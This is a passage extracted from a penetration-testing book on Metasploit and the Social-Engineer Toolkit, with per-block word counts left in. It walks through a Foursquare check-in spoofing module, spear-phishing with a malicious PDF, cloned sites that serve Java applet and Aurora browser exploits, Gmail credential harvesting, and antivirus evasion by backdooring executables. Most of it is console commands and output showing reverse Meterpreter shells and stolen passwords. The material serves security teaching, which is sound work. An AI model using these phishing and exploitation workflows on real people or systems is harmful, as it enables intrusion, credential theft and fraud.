.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursquare.rb
[Word Count: 8]

We’ve placed the module in our auxiliary directory X so that it will be 
available for use by Metasploit. But before we use this module, let’s look at 
the actual script and break down the components so we can see exactly 
what the module contains.
[Word Count: 45]

X class Metasploit3 < Msf::Auxiliary
    
    # Exploit mixins should be called first
Y
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
[Word Count: 17]

The module begins with the first two lines importing the auxiliary class X. 
Next it makes the HTTP client functions available for use Y within the script.
[Word Count: 27]

X def initialize
        super(
Y'Name'         => 'Foursquare Location Poster', 
            'Version       => '$Revision:$',
            'Description'  => 'F*ck with Foursquare, be anywhere you want to be by venue id',
            'Author'       => ['CG'],
            'License'      => MSF_LICENSE,
            'References'   =>
                [
                    [ 'URL', 'http://groups.google.com/group/foursquare-api' ],
                    [ 'URL', 'http://www.mikekey.com/im-a-foursquare-cheater/'],
                ]
        )
#todo pass in geocoords instead of venueid, create a venueid, other tom foolery
        register_options(
            [
ZOpt::RHOST('api.foursquare.com'), 
                OptString.new('VENUEID', [ true, 'foursquare venueid', '185675']), #Louvre 
Paris France
                OptString.new('USERNAME', [ true, 'foursquare username', 'username']),
                OptString.new('PASSWORD', [ true, 'foursquare password', 'password']),
            ], self.class)
    
end
[Word Count: 84]

Within the initialization constructor X we define much of the informa-
tion Y that is reported back when issuing the info command in msfconsole. 
We can see where the various options are defined Z and whether they are 
required. So far, all are pretty direct and their purposes are clear. Still, we 
have yet to see any actual logic being performed. That comes next.
[Word Count: 64]

def run
    
        begin
Xuser = datastore['USERNAME']
            pass = datastore['PASSWORD']
            venid = datastore['VENUEID']
            user_pass = Rex::Text.encode_base64(user + ":" + pass)
            decode = Rex::Text.decode_base64(user_pass)
            postrequest = "twitter=1\n" #add facebook=1 if you want facebook
[Word Count: 31]

print_status("Base64 Encoded User/Pass: #{user_pass}") #debug
            print_status("Base64 Decoded User/Pass: #{decode}") #debug
[Word Count: 10]

Yres = send_request_cgi({
                'uri'     => "/v1/checkin?vid=#{venid}",
                'version'    => "1.1",
                'method'  => 'POST',
                'data'   => postrequest,
                'headers' =>
                    {
                        'Authorization' => "Basic #{user_pass}",
                        'Proxy-Connection' =>  "Keep-Alive",
                    }
            }, 25)
[Word Count: 28]

Now we reach the actual logic of the script—what happens when run is 
called within the module. Initially the provided options are set to local vari-
able names X along with defining various other objects. An object is then 
created by calling the send_request_cgi method Y imported into the script 
from lib/msf/core/exploit/http.rb and defined as “Connects to the server, cre-
ates a request, sends the request, reads the response.” This method takes var-
ious parameters that make up the call to the actual server, as shown here.
[Word Count: 87]

Xprint_status("#{res}") #this outputs the entire response. We could probably do 
#without this but it's nice to see what's going on.
            end
[Word Count: 21]

Yrescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout 
        rescue ::Timeout::Error, ::Errno::EPIPE =>e
            puts e.message
    end
end
[Word Count: 12]

After this object is created, the results are printed X. If anything goes 
wrong, logic exists for catching any errors Y and reporting them to the user. 
All of this logic is simple and is just a matter of plugging various parameters
[Word Count: 42]

into existing functions of the Framework. This is a great example of the 
power of the Framework, because it allows us to concentrate only on the 
information needed to address our goal. There is no reason to reproduce 
any of the standard functions such as error handling, connection manage-
ment, and so on.
Let’s see this module in action. If you don’t remember the full path to 
the module within the Metasploit directory structure, search for it like so.
[Word Count: 79]

X msf > search foursquare
[*] Searching loaded modules for pattern 'foursquare'...
[Word Count: 12]

Name              Rank    Description
   ----              ----    -----------
   admin/foursquare  normal  Foursquare Location Poster
[Word Count: 11]

Y msf > use admin/foursquare
Z msf auxiliary(foursquare) > info
[Word Count: 10]

Name: Foursquare Location Poster
    Version: $Revision:$
    License: Metasploit Framework License (BSD)
       Rank: Normal
[Word Count: 13]

Basic options:
  Name      Current Setting     Required  Description
  ----      ---------------     --------  -----------
  PASSWORD  password            yes       foursquare password
  Proxies                       no        Use a proxy chain
  RHOST     api.foursquare.com  yes       The target address
  RPORT     80                  yes       The target port
  USERNAME  username            yes       foursquare username
  VENUEID   185675              yes       foursquare venueid
  VHOST                         no        HTTP server virtual host
[Word Count: 50]

Description:
  F*ck with Foursquare, be anywhere you want to be by venue id
[Word Count: 13]

References:
  http://groups.google.com/group/foursquare-api
  http://www.mikekey.com/im-a-foursquare-cheater/
[Word Count: 3]

In the prior example, we search for “foursquare” X, issue the use com-
mand Y to select the auxiliary module, and display the information Z for 
the selected module. Based on the options presented above, we need to con-
figure a few of them first.
[Word Count: 45]

X msf auxiliary(foursquare) > set VENUEID 2584421
VENUEID => 2584421
msf auxiliary(foursquare) > set USERNAME msf@elwood.net
USERNAME => metasploit
msf auxiliary(foursquare) > set PASSWORD ilovemetasploit
PASSWORD => ilovemetasploit
Y msf auxiliary(foursquare) > run
[*] Base64 Encoded User/Pass: bXNmQGVsd29vZC5uZXQ6aWxvdmVtZXRhc3Bsb2l0
[*] Base64 Decoded User/Pass: msf@elwood.net:ilovemetasploit
[*] HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Date: Sat, 08 May 2010 07:42:09 GMT
Content-Length: 1400
Server: nginx/0.7.64
Connection: keep-alive
[Word Count: 63]

<?xml version="1.0" encoding="UTF-8"?>
<checkin><id>40299544</id><created>Sat, 08 May 10 07:42:09 +0000</created><message>OK! 
We've got you @ Washington DC Union Station. This is your 1st checkin here!</message>
<venue><id>2584421</id><name>Washington DC Union Station</name><primarycategory><id>79283</
id><fullpathname>Travel:Train Station</fullpathname><nodename>Train Station</nodename>
<iconurl>http://foursquare.com/img/categories/travel/trainstation.png</iconurl></primary
category><address>Union Station</address><city>Washington</city><state>DC</state><geolat>
38.89777986957695</geolat><geolong>-77.0060920715332</geolong></venue><mayor><type>nochange
</type><checkins>4</checkins><user><id>685446</id><firstname>Ron</firstname><photo>http://
playfoursquare.s3.amazonaws.com/userpix_thumbs/ELOW44QHXJFB4PWZ.jpg</photo><gender>male</
gender></user><message>Ron is The Mayor of Washington DC Union Station.</message></mayor>
<badges><badge><id>1</id><name>Newbie</name><icon>http://foursquare.com/img/badge/newbie
.png</icon><description>Congrats on your first check-in!</description></badge></badges>
<scoring><score><points>1</points><icon>http://foursquare.com/img/scoring/2.png</icon>
<message>First stop tonightZ</message></score><score><points>5</points><icon>http://
foursquare.com/img/scoring/1.png</icon><message>First time @ Washington DC Union Station!</
message></score></scoring></checkin>
[Word Count: 63]

In order to run this module successfully, we need a valid set of Four-
square credentials to do the check-in. We first define the VenueID that we 
find online with a bit of Googling X, and then we set our Foursquare creden-
tials Y and run the module. We get a successful result with the Foursquare 
service confirming our check-in and giving us five points Z. 
In this case, we have submitted a request to “check in” at Union Station 
in Washington, DC, on the Foursquare service (see Figure 9-1).
[Word Count: 90]

Figure 9-1: A successful check-in at Union Station
[Word Count: 8]

When we check the Foursquare website, we see a successful result. Mod-
ules like these demonstrate that Metasploit allows us to implement nearly 
anything we can programmatically imagine.
[Word Count: 28]

T H E  S O C I A L - E N G I N E E R  
T O O L K I T
[Word Count: 25]

The Social-Engineer Toolkit (SET) was developed to 
coincide with the release of Social-Engineer.org, a set 
of resources conceived by Chris Hadnagy (loganWHD) 
and written by one of this book’s authors, David 
Kennedy. The site offers a centralized location for 
social-engineering tutorials and explains terminologies, 
definitions, and scenarios that can help prepare you 
for hacking the human mind.
[Word Count: 57]

The purpose of SET is to fill a gap in the penetration testing community 
and bring awareness to social-engineering attacks. And it has succeeded—
SET has been downloaded 1 million times and is now an industry standard for 
deploying social-engineering attacks. The toolkit attacks human weaknesses, 
exploiting curiosity, credibility, avarice, and simple human stupidity. Social-
engineering attacks are at an all-time high and have always been a large risk 
for many organizations.
[Word Count: 72]

By default, in Back|Track, SET is located in the /pentest/exploits/set/ directory. 
Before you begin, make sure that you are running the latest version of SET.
[Word Count: 25]

root@bt:/pentest/exploits/set# svn update
[Word Count: 3]

Next, configure your SET configuration file according to what you’re 
attempting to accomplish. We’ll cover a couple of simple features within the 
configuration file config/set_config within the root SET directory.
When using the SET web-based attack vectors, you can turn ON the 
WEBATTACK_EMAIL flag to perform email phishing in conjunction with the web 
attack. This flag is turned OFF by default, which means that you will configure 
SET and use the web attack vector without the support of email phishing.
[Word Count: 80]

One of the web-based attacks available in SET is the Java applet attack, 
which uses self-signed Java applets. By default, this attack uses Microsoft as 
the publisher name; however, if the Java Development Kit (JDK) has been 
installed, you can turn this option ON and sign the applet with whatever name 
you want. When you turn this flag ON, additional options will be available 
through the interface.
[Word Count: 67]

The AUTO_DETECT setting is one of the most important flags and is turned 
ON by default. It tells SET to detect your local IP address automatically and to
[Word Count: 28]

use that as the address for the reverse connection and web servers. If you are 
using multiple interfaces or your reverse payload listener is housed at a dif-
ferent location, turn this flag OFF. When this option is OFF, SET will allow you 
to specify multiple scenarios to ensure that the proper IP address scheme is 
used, for example, in a scenario that includes NAT and port forwarding. 
These options are reflected within the SET interface.
[Word Count: 76]

When you use the toolkit, by default it uses a built-in Python web-based 
server. To optimize performance, set the APACHE_SERVER flag to ON, and SET 
will use Apache for the attacks.
[Word Count: 31]

Those are the basics of the configuration file. As you can see, you can 
significantly change SET’s behavior depending on which flags are set in the 
tool. Now let’s run the tool.
[Word Count: 32]

X 1.  Spear-Phishing Attack Vectors
2.  Website Attack Vectors
3.  Infectious Media Generator
4.  Create a Payload and Listener
5.  Mass Mailer Attack
6.  Teensy USB HID Attack Vector
7.  SMS Spoofing Attack Vector
8.  Wireless Access Point Attack Vector
9.  Third Party Modules
[Word Count: 44]

10. Update the Metasploit Framework
11. Update the Social-Engineer Toolkit
12. Help, Credits, and About
13. Exit the Social-Engineer Toolkit
[Word Count: 20]

Welcome to the SET E-Mail attack method. This module allows you
to specially craft email messages and send them to a large (or small)
number of people with attached fileformat malicious payloads. If you
want to spoof your email address, be sure "Sendmail" is installed (it
is installed in BT4) and change the config/set_config SENDMAIL=OFF flag
to SENDMAIL=ON.
[Word Count: 58]

There are two options, one is getting your feet wet and letting SET do
everything for you (option 1), the second is to create your own FileFormat
payload and use it in your own attack. Either way, good luck and enjoy!
[Word Count: 41]

Y 1. Perform a Mass Email Attack
2. Create a FileFormat Payload
3. Create a Social-Engineering Template
4. Return to Main Menu
[Word Count: 22]

Select the file format exploit you want.
The default is the PDF embedded EXE.
[Word Count: 14]

Enter the number you want (press enter for default): 8
[Word Count: 10]

1. Windows Reverse TCP Shel
Spawn a command shell on victim and send back to 
attacker.
2. Windows Meterpreter Reverse_TCP
Spawn a meterpreter shell on victim and send back 
to attacker.
[Word Count: 31]

3. Windows Reverse VNC DLL
Spawn a VNC server on victim and send back to 
attacker.
4. Windows Reverse TCP Shell (x64)
Windows X64 Command Shell, Reverse TCP Inline
5. Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64), 
Meterpreter
6. Windows Shell Bind_TCP (X64)
Execute payload and create an accepting port on 
remote system.
7. Windows Meterpreter Reverse HTTPS
Tunnel communication over HTTP using SSL and use 
Meterpreter.
[Word Count: 71]

[ Enter the payload you want (press enter for default): 
[*] Windows Meterpreter Reverse TCP selected.
Enter the port to connect back on (press enter for default):
[*] Defaulting to port 443...
[*] Generating fileformat exploit...
[*] Please wait while we load the module tree...
[*] Started reverse handler on 10.10.1.112:443
[*] Creating 'template.pdf' file...
[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf
[*] Payload creation complete.
[*] All payloads get sent to the src/msf_attacks/template.pdf directory
[*] Payload generation complete. Press enter to continue.
[Word Count: 81]

As an added bonus, use the file-format creator in SET to create your attachment.
Right now the attachment will be imported with filename of 'template.whatever'
Do you want to rename the file?
example Enter the new filename: moo.pdf
[Word Count: 38]

\ 1. Keep the filename, I don't care.
2. Rename the file, I want to be cool.
[Word Count: 17]

Enter your choice (enter for default): 1
Keeping the filename and moving on.
[Word Count: 13]

There are two options on the mass e-mailer, the first would
be to send an email to one individual person. The second option
will allow you to import a list and send it to as many people as
you want within that list.
[Word Count: 43]

X 1. E-Mail Attack Single Email Address
2. E-Mail Attack Mass Mailer
3. Return to main menu.
[Word Count: 17]

Do you want to use a predefined template or craft
a one time email template.
[Word Count: 15]

Y 1. Pre-Defined Template
2. One-Time Use Email Template
[Word Count: 9]

Enter your choice: 1
Below is a list of available templates:
[Word Count: 11]

1: New Update
2: Computer Issue
3: Strange internet usage from your computer
4: LOL...have to check this out...
Z 5: Status Report
6: Pay Raise Application Form
7: WOAAAA!!!!!!!!!! This is crazy...
8: BasketBall Tickets
9: Baby Pics
10: Have you seen this?
11: Termination List
12: How long has it been?
13: Dan Brown's Angels & Demons
[Word Count: 59]

[ Enter who you want to send email to: ihazomgsecurity@secmaniac.com
[Word Count: 10]

1. Use a GMAIL Account for your email attack.
2. Use your own server or open relay
[Word Count: 17]

Enter your choice: 1
\ Enter your GMAIL email address: fakeemailaddy@gmail.com
Enter your password for gmail (it will not be displayed back to you):
[Word Count: 24]

Next we email this attack to a single email address X using the SET pre-
defined email template Y Status Report Z. Finally, we enter the email address 
(ihazomgsecurity@secmaniac.com) [ to send the malicious file to and have SET 
use a Gmail account \ to send the message.
[Word Count: 48]

Finally, create a Metasploit listener for the payload to connect back to X. 
When SET launches Metasploit, it configures all the necessary options and 
starts to listen on your attacking IP address on port 443 Y, as configured 
earlier.
[Word Count: 39]

X Do you want to setup a listener yes or no: yes
[Word Count: 12]

resource (src/program_junk/meta_config)> use exploit/multi/handler
resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 10.10.1.112
LHOST => 10.10.1.112
resource (src/program_junk/meta_config)> set LPORT 443
LPORT => 443
resource (src/program_junk/meta_config)> set ENCODING shikata_ga_nai
ENCODING => shikata_ga_nai
resource (src/program_junk/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
Y [*] Started reverse handler on 10.10.1.112:443
[*] Starting the payload handler...
msf exploit(handler) >
[Word Count: 69]

We’ve just set up an attack against ihazomgsecurity@secmaniac.com, crafted an 
email to the recipient, and used an Adobe file format exploit. SET allowed 
us to create templates and have them dynamically imported when we use the 
tool. When the target opens the email and double-clicks the Adobe file, he’ll 
see something like Figure 10-1.
[Word Count: 54]

Figure 10-1: The target’s view of the infected PDF file
[Word Count: 10]

The target opens the PDF thinking it’s legitimate, and his system is 
instantly compromised. On the attacker’s side, you see the following:
[Word Count: 22]

[*] Started reverse handler on 10.10.1.112:443
[*] Starting the payload handler...
msf exploit(handler) > [*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58087)
[Word Count: 29]

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

meterpreter > shell
Process 2976 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 19]

This example used a spear-phishing attack to target one user, but SET 
can also be used to attack multiple targets using the “mass email” option. 
You can also create customized templates that can be reused, instead of 
using the prebuilt templates included in SET.
[Word Count: 44]

Web attack vectors are probably one of the most advanced and exciting 
aspects of SET, because they are specifically crafted to be believable and 
enticing to the target. SET can clone websites that look identical to trusted 
sites, helping to ensure that the target will think he is visiting a legitimate site.
[Word Count: 52]

Enter your choice (press enter for default): 1
[Word Count: 8]

The first method will allow SET to import a list of pre-defined
web applications that it can utilize within the attack.
[Word Count: 21]

The second method will completely clone a website of your choosing
and allow you to utilize the attack vectors within the completely
same web application you were attempting to clone.
[Word Count: 30]

The third method allows you to import your own website, note that you
should only have an index.html when using the import website
functionality.
[Word Count: 24]

1. Web Templates
Z 2. Site Cloner
3. Custom Import
4. Return to main menu
[Word Count: 15]

SET supports both HTTP and HTTPS
Example: http://www.thisisafakesite.com
[ Enter the url to clone: http://www.secmaniac.com
[Word Count: 15]

[*] Cloning the website: http://www.secmaniac.com
[*] This could take a little bit...
[*] Injecting Java Applet attack into the newly cloned website.
[*] Filename obfuscation complete. Payload name is: 0xvV3cYfbLBI3
[*] Malicious java applet website prepped for deployment
[Word Count: 38]

To begin this attack scenario, select Website Attack Vectors X from the 
SET main menu. Use the Java Applet Attack Method Y, and then choose Site 
Cloner Z from the subsequent menu. Finally, tell SET to clone the SecManiac 
website [.
[Word Count: 41]

Name:                                      Description:
[Word Count: 2]

2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send 
back to attacker.
[Word Count: 15]

Below is a list of encodings to try and bypass AV.
[Word Count: 11]

Select one of the below, 'backdoored executable' is typically the best.
[Word Count: 11]

Y Enter your choice (enter for default): 
[-] Enter the PORT of the listener (enter for default):
[Word Count: 17]

[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
[-] Backdoor completed successfully. Payload is now hidden within a legit executable.
[Word Count: 24]

********************************************************
Do you want to create a Linux/OSX reverse_tcp payload
in the Java Applet attack as well?
********************************************************
[Word Count: 18]

***************************************************
Web Server Launched. Welcome to the SET Web Attack.
***************************************************
[Word Count: 11]

[--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--]
[Word Count: 11]

[*] Launching MSF Listener...
[*] This may take a few to load MSF...
[Word Count: 13]

As with other SET attack methods, attackers can use a variety of pay-
loads. The default reverse Meterpreter payload X is usually an excellent 
selection. For this scenario, you can simply select the defaults when prompted 
for the encoder to use Y and the port to use to reconnect.
With the configuration complete, SET launches Metasploit:
[Word Count: 56]

resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
[Word Count: 10]

X [*] Started reverse handler on 10.10.1.112:443
[*] Starting the payload handler...
msf exploit(handler) >
[Word Count: 15]

SET passes all necessary options to Metasploit, which then sets up the 
reverse Meterpreter listener on port 443 X.
[Word Count: 19]

NOTE
You have created a web server housing a cloned instance of http://www.secmaniac
.com/. If you had changed the configuration file to include WEBATTACK_EMAIL=ON, you 
would have been prompted to send an email using the spear-phishing attack vector 
(minus attachments).
[Word Count: 40]

Now that everything is set up, you simply need to get a target to browse 
to the malicious site. Upon reaching the website, the target sees a pop-up 
warning from the publisher, Microsoft, as shown in Figure 10-2. If the target 
clicks Run, and most users will, the payload will be executed, and you gain 
full control of the user’s system.
[Word Count: 61]

NOTE
Recall that SET’s configuration can self-sign the Java applet with whatever you want. 
Remember, too, that when the target clicks Run and the payload is executed and deliv-
ered, the target is redirected to the legitimate SecManiac website.
[Word Count: 39]

Back at our attacker machine, the Meterpreter session is successfully 
established, and we now have access to the target’s machine as shown here.
[Word Count: 23]

msf exploit(handler) > [*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58550)
[Word Count: 18]

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

shellmeterpreter > shell
Process 2800 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 19]

C:\Documents and Settings\Administrator\Desktop>
[Word Count: 3]

X 2.  Website Attack Vectors
Enter your choice: 2
[Word Count: 9]

Y 2. The Metasploit Browser Exploit Method
[Word Count: 7]

Enter your choice (press enter for default): 2
[Word Count: 8]

SET supports both HTTP and HTTPS
Example: http://www.thisisafakesite.com
[ Enter the url to clone: http://www.secmaniac.com
[Word Count: 15]

Select Website Attack Vectors X from the SET main menu, and then 
select The Metasploit Browser Exploit Method Y. Then select the Site Cloner Z 
option, and enter http://www.secmaniac.com [ as the website you want to use 
for cloning.
Once the site is cloned, we’ll set up the exploit to trigger when a target 
browses the site.
[Word Count: 57]

Enter the browser exploit you would like to use
[Word Count: 9]

X 16. Microsoft Internet Explorer "Aurora"
[Word Count: 6]

Enter your choice (1-23) (enter for default): 16
What payload do you want to generate:
[Word Count: 15]

Name:                                      Description:
[Word Count: 2]

2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send 
back to attacker.
[Word Count: 15]

Y Enter choice (example 1-10) (Enter for default): 
Enter the port to use for the reverse (enter for default):
[Word Count: 19]

[*] Cloning the website: http://www.secmaniac.com
[*] This could take a little bit...
[*] Injecting iframes into cloned website for MSF Attack....
[*] Malicious iframe injection successful...crafting payload.
[*] Launching MSF Listener...
[*] This may take a few to load MSF...
[Word Count: 40]

resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(ms10_002_aurora) >
[*] Started reverse handler on 10.10.1.112:443
[*] Using URL: http://0.0.0.0:8080/
[*]  Local IP: http:// 10.10.1.112:8080/
[*] Server started.
[Word Count: 31]

msf exploit(handler) > 
[*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58412)
[Word Count: 18]

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

shellmeterpreter > shell
Process 2819 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 19]

C:\Documents and Settings\Administrator\Desktop>
[Word Count: 3]

In the preceding examples, the goal was to obtain access to the individual sys-
tem. Relatively new within SET is the ability to clone a website and harvest vis-
itors’ credentials when they access the site, as we’ll demonstrate using Gmail 
in this next example. SET can create a clone of the Gmail website and then 
automatically rewrite the POST parameters of that website to post to the 
SET web server and then redirect the user to the legitimately cloned website.
[Word Count: 81]

Enter your choice (press enter for default): 3
[Word Count: 8]

Email harvester will allow you to utilize the clone capabilities within SET
to harvest credentials or parameters from a website as well as place them into 
a report.
[Word Count: 28]

SET supports both HTTP and HTTPS
Example: http://www.thisisafakesite.com
Z Enter the url to clone: http://www.secmaniac.com
[Word Count: 15]

Press {return} to continue.
[*] Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
[Word Count: 29]

10.10.1.102 - - "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ltmpl=default
PARAM: ltmplcache=2
PARAM: continue=https://mail.google.com/mail/?
PARAM: service=mail
PARAM: rm=false
PARAM: dsh=-1174166214807618980
PARAM: ltmpl=default
PARAM: ltmpl=default
PARAM: scc=1
PARAM: ss=1
PARAM: GALX=S3ftXFIww0E
POSSIBLE USERNAME FIELD FOUND: Email=ihazomgsecurity2390239203
POSSIBLE PASSWORD FIELD FOUND: Passwd=thisisacomplexp@55w0rd!!!!!
PARAM: rmShown=1
PARAM: signIn=Sign+in
PARAM: asts=
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
[Word Count: 64]

Figure 10-3: Credential harvester report
[Word Count: 5]

A man-left-in-the-middle attack uses HTTP referers on an already compromised 
site or a cross-site scripting (XSS) vulnerability to pass the target’s credentials 
back to the HTTP server. If you find an XSS vulnerability and send the URL 
to the target, who then clicks the link, the website will operate normally, 
but when the target logs into the system, his credentials are passed to the 
attacker. The man-left-in-the-middle attack vector can be accessed through 
SET’s web attack vector interface.
[Word Count: 78]

Enter your choice (press enter for default): 6
[Word Count: 8]

SET supports both HTTP and HTTPS
Example: http://www.thisisafakesite.com
Z Enter the url to clone: https://gmail.com
[Word Count: 15]

[*] Cloning the website: https://gmail.com
[*] This could take a little bit...
[Word Count: 12]

The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a website.
[*] I have read the above message. [*]
[Word Count: 32]

[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.
[Word Count: 12]

When the target visits the cloned site, he will see the link shown in 
Figure 10-4. Notice that the URL at the lower-left corner shows https://
gmail.com/.
[Word Count: 27]

Figure 10-4: Initial page and link to the cloned page
[Word Count: 10]

When the target clicks the link, he is presented with the cloned web 
page shown in Figure 10-5, which looks exactly like the real Gmail Wel-
come page.
[Word Count: 28]

Notice that the URL text at the top of Figure 10-5 shows our malicious 
web server. As in preceding examples, you can register a similar domain 
name to avoid this issue. Once the target enters his username and password 
in the appropriate fields, you can intercept and harvest the credentials.
[Word Count: 50]

Putting It All Together with a Multipronged Attack
[Word Count: 8]

1. The Java Applet Attack Method
2. The Metasploit Browser Exploit Method
3. Credential Harvester Attack Method
4. Tabnabbing Attack Method
5. Man Left in the Middle Attack Method
6. Web Jacking Attack Method
X 7. Multi-Attack Web Method
8. Return to the previous menu
[Word Count: 45]

Enter your choice (press enter for default): 7
[Word Count: 8]

Z Enter the url to clone: https://gmail.com
Select which attacks you want to use:
[Word Count: 14]

[ 1. The Java Applet Attack Method (OFF)
\ 2. The Metasploit Browser Exploit Method (OFF)
3. Credential Harvester Attack Method (OFF)
4. Tabnabbing Attack Method (OFF)
5. Man Left in the Middle Attack Method (OFF)
] 6. Web Jacking Attack Method (OFF)
7. Use them all - A.K.A. 'Tactical Nuke'
8. I'm finished and want to proceed with the attack.
9. Return to main menu.
[Word Count: 66]

Enter your choice one at a time (hit 8 or enter to launch): 1
[Word Count: 14]

Turning the Java Applet Attack Vector to ON
[Word Count: 8]

Enter your choice one at a time (hit 8 or enter to launch): 2
[Word Count: 14]

Turning the Metasploit Client Side Attack Vector to ON
[Word Count: 9]

Option added. Press {return} to add or prepare your next attack.
[Word Count: 11]

Enter your choice one at a time (hit 8 or enter to launch): 6
[Word Count: 14]

Turning the Web Jacking Attack Vector to ON
[Word Count: 8]

Enter your choice one at a time (hit 8 or enter to launch):
[Word Count: 13]

Enter your choice one at a time (hit 8 or enter to launch):
What payload do you want to generate:
[Word Count: 20]

Name:                                      Description:
[Word Count: 2]

X 2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send 
back to attacker.
[Word Count: 16]

Below is a list of encodings to try and bypass AV.
[Word Count: 11]

Select one of the below, 'backdoored executable' is typically the best.
[Word Count: 11]

Enter your choice (enter for default): 
[-] Enter the PORT of the listener (enter for default):
[Word Count: 16]

[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
[-] Backdoor completed successfully. Payload is now hidden within a legit executable.
[Word Count: 24]

********************************************************
Do you want to create a Linux/OSX reverse_tcp payload
in the Java Applet attack as well?
********************************************************
[Word Count: 18]

Enter the browser exploit you would like to use
[Word Count: 9]

[ 8. Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)
[Word Count: 9]

Enter your choice (1-12) (enter for default): 8
[Word Count: 8]

[*] Cloning the website: https://gmail.com
[*] This could take a little bit...
[*] Injecting Java Applet attack into the newly cloned website.
[*] Filename obfuscation complete. Payload name is: x5sKAzS
[*] Malicious java applet website prepped for deployment
[Word Count: 38]

[*] Injecting iframes into cloned website for MSF Attack....
[*] Malicious iframe injection successful...crafting payload.
[Word Count: 15]

resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(ms09_002_memory_corruption) >
[*] Started reverse handler on 172.16.32.129:443
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://172.16.32.129:8080/
[*] Server started.
[Word Count: 30]

[*] Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory
[Word Count: 8]

This exploit fails, because we are using Internet Explorer 6. The target’s 
screen is shown in Figure 10-6.
[Word Count: 18]

Figure 10-6: Multi-attack security warning
[Word Count: 5]

[*] Sending stage (748544 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.129:443 -> 172.16.32.131:1333) at 
Thu Sep 09 12:33:20 -0400 2010
[*] Session ID 1 (172.16.32.129:443 -> 172.16.32.131:1333) processing 
InitialAutoRunScript 'migrate -f'
[*] Current server process: java.exe (824)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3044
[*] New server process: notepad.exe (3044)
msf exploit(ms09_002_memory_corruption) >
[Word Count: 60]

Now let’s say that this attack fails, and the target clicks Cancel (without 
the repeater option enabled). He would then be prompted to enter his user-
name and password into the username and password fields, allowing you to 
successfully harvest the credentials on the website and still have a successful
[Word Count: 50]

attack. While you wouldn’t have a Meterpreter shell, because the target didn’t 
click Run, you would still be able to intercept the credentials:
[Word Count: 23]

[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: Email=thisismyusername
POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
[Word Count: 28]

As you’ve seen in the preceding examples, you can see that SET offers a 
number of powerful web-based attack vectors in its arsenal. It can be difficult 
to persuade a target to think that a cloned site is legitimate. Most knowl-
edgeable users are generally cautious about unfamiliar sites and try to avoid 
potential security issues as they browse the Internet. SET tries to leverage this 
cautiousness and, by letting you mimic a known website, fool even some of 
the savviest technical folks.
[Word Count: 83]

The Infectious Media Generator is a relatively simple attack vector. With this 
vector, SET creates a folder for you that you can either burn to a CD/DVD or 
store on a USB thumb drive. The autorun.inf file is used, which, once inserted 
into a target’s machine, will execute whatever you specify during attack cre-
ation. Currently, SET supports executables (such as Meterpreter) as well as 
file-format bugs (such as Adobe exploits).
[Word Count: 71]

Welcome to the Teensy HID Attack Vector.
[Word Count: 7]

1. Powershell HTTP GET MSF Payload
Y 2. WSCRIPT HTTP GET MSF Payload
3. Powershell based Reverse Shell
4. Return to the main menu.
[Word Count: 24]

Enter your choice: 2
Z Do you want to create a payload and listener yes or no: yes
What payload do you want to generate:
[Word Count: 25]

Name:                                      Description:
[Word Count: 2]

2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send 
back to attacker.
[Word Count: 15]

Below is a list of encodings to try and bypass AV.
[Word Count: 11]

Select one of the below, 'backdoored executable' is typically the best.
[Word Count: 11]

\ Enter your choice (enter for default): 
[-] Enter the PORT of the listener (enter for default):
[Word Count: 17]

[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
[-] Backdoor completed successfully. Payload is now hidden within a legit executable
[Word Count: 24]

